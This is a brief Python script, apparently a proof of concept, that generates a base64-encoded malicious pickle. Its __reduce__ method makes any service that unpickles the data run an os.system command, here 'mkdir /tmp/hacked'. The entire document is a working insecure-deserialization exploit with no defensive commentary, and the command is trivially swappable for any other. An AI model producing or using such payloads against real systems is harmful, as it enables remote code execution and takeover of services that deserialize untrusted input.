import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('mkdir /tmp/hacked')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))